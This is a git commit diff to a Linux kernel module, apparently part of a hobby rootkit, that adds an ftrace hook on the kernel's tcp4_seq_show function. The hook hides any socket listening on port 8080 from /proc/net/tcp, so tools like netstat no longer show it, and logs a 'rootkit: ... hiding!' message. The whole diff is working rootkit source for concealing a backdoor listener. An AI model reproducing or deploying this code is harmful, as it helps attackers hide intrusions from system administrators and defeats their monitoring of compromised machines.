0ba962c356bd18f17d2eaafc34442f236d8f3b0d
itamar <itamarmaouda101@gmail.com>
2020-12-08 13:02:51 -0800

    nedd to make it clean

--- hide_proc_net.c
+++ hide_proc_net.c
@@ -1,16 +1,32 @@
 #include "hide_proc_net.h"
+//#include "ftrace_helper.h"
+struct ftrace_hook tcp4_hook = HOOK("tcp4_seq_show", hook_tcp4_seq_show, &org_tcp4_seq_show);
+
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+    long ret;
+    struct sock *sk = v;
+    if (sk != 0x1 && sk->sk_num == 0x1f90)
+    {
+		printk(KERN_ALERT "rootkit: Found process listening on port 8080 - hiding!\n");
+		return 0;
+	}
+    ret = org_tcp4_seq_show(seq, v);
+    return ret;
+
+}
 static int __init netstat_hide(void)
 {
-    //int ret;
-    get_addr();
+    int ret;
+    ret = install_hook(&tcp4_hook);
     //ret = set_ops("/proc/net/tcp");
-    //printk(KERN_ALERT "set ops done, ret equals to : %d", ret);
+    printk(KERN_ALERT "set ops done, ret equals to : %d", ret);
 
     return 0;
 }
 static void __exit unhide(void)
 {
-    //unhook_seq();
+    fh_remove_hook(&tcp4_hook);
 }
 MODULE_LICENSE("GPL");
 module_init(netstat_hide);
